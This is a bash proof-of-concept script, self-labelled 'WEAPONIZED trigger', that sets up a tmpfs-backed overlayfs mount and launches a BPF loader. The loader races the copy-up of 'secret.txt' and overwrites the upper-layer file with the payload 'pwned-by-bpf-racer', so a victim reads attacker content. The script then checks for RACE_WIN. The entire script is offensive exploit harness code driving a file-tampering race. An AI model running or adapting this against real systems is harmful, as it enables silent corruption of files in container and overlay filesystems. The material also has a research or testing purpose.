#!/bin/bash
# ch02 WEAPONIZED trigger. Demonstrates a BEFORE/AFTER difference caused
# by a BPF-driven copy-up race.
#
# BEFORE: no loader — victim writes mutation to an overlayfs merged file,
# reads it back, content matches what was written.
#
# AFTER: loader attached with -r/-t/-w. The ringbuf copy-up event is used
# as the race signal; the loader opens <upperdir>/<basename> O_WRONLY|
# O_TRUNC and overwrites it before the victim re-reads. Victim reads the
# racer's payload, not its own write.
#
# Success: BEFORE_CONTENT != AFTER_CONTENT and AFTER_CONTENT == PAYLOAD.
set +e

HERE="$(cd "$(dirname "$0")" && pwd)"

if [ ! -x "$HERE/build/ch02-overlayfs" ]; then
    echo "=== CH02_SKIP reason=\"loader not built at $HERE/build/ch02-overlayfs\" ==="
    exit 0
fi

D="/mnt/ovlbacking"
MOUNTED_TMPFS=0
MOUNTED_OVERLAY=0
LPID=0
PAYLOAD="pwned-by-bpf-racer"
TARGET="secret.txt"
VICTIM_WRITE="mutation"

cleanup() {
    if [ "$LPID" != "0" ]; then
        kill "$LPID" 2>/dev/null
        wait "$LPID" 2>/dev/null
    fi
    if [ "$MOUNTED_OVERLAY" = "1" ]; then
        umount "$D/merged" 2>/dev/null
    fi
    if [ "$MOUNTED_TMPFS" = "1" ]; then
        umount "$D" 2>/dev/null
    fi
}
trap cleanup EXIT INT TERM

seed_overlay() {
    if [ "$MOUNTED_OVERLAY" = "1" ]; then
        umount "$D/merged" 2>/dev/null; MOUNTED_OVERLAY=0
    fi
    rm -rf "$D"/*
    mkdir -p "$D"/{lower,upper,work,merged}
    echo "original-secret" > "$D/lower/$TARGET"
    if mount -t overlay overlay \
            -o "lowerdir=$D/lower,upperdir=$D/upper,workdir=$D/work" \
            "$D/merged"; then
        MOUNTED_OVERLAY=1
    else
        echo "overlay mount failed"; exit 1
    fi
}

echo "=== preparing tmpfs backing at $D ==="
mkdir -p "$D"
if mount -t tmpfs tmpfs "$D" 2>/dev/null; then MOUNTED_TMPFS=1; fi

# ---------- PHASE 1: BEFORE (no BPF racer) ----------
seed_overlay
echo "=== BEFORE (no BPF racer) ==="
echo "$VICTIM_WRITE" > "$D/merged/$TARGET"
sync
sleep 0.3
BEFORE_CONTENT="$(cat "$D/merged/$TARGET")"
echo "BEFORE_CONTENT=[$BEFORE_CONTENT]"

# ---------- PHASE 2: AFTER (racer active) ----------
seed_overlay
echo "=== starting BPF racer loader ==="
"$HERE/build/ch02-overlayfs" \
    -r "$D/upper" -t "$TARGET" -w "$PAYLOAD" \
    >/tmp/ch02.racer.out 2>/tmp/ch02.racer.err &
LPID=$!

# Wait until loader reports ready
for _ in $(seq 1 50); do
    if grep -q "status=ready" /tmp/ch02.racer.err 2>/dev/null; then break; fi
    sleep 0.1
done
if ! grep -q "status=ready" /tmp/ch02.racer.err 2>/dev/null; then
    echo "loader failed to become ready; stderr:"
    cat /tmp/ch02.racer.err
    echo "=== CH02_SKIP reason=\"loader did not become ready (overlayfs kprobe unavailable)\" ==="
    exit 0
fi

echo "=== AFTER (racer active) ==="
echo "$VICTIM_WRITE" > "$D/merged/$TARGET"
sync
# Give racer time to consume ringbuf event and rewrite upper file.
sleep 0.5
AFTER_CONTENT="$(cat "$D/merged/$TARGET")"
echo "AFTER_CONTENT=[$AFTER_CONTENT]"

echo "=== loader stderr tail ==="
tail -n 40 /tmp/ch02.racer.err

echo "=== VERDICT ==="
echo "BEFORE_CONTENT=[$BEFORE_CONTENT]"
echo "AFTER_CONTENT=[$AFTER_CONTENT]"

if [ "$BEFORE_CONTENT" = "$AFTER_CONTENT" ]; then
    echo "[ch02] RACE_LOSS: BEFORE == AFTER, weapon had no effect"
    exit 1
fi
if [ "$AFTER_CONTENT" != "$PAYLOAD" ]; then
    echo "[ch02] RACE_PARTIAL: AFTER differs from BEFORE but is not the payload"
    exit 1
fi
echo "[ch02] RACE_WIN: AFTER==PAYLOAD, BPF-driven copy-up race succeeded"
exit 0
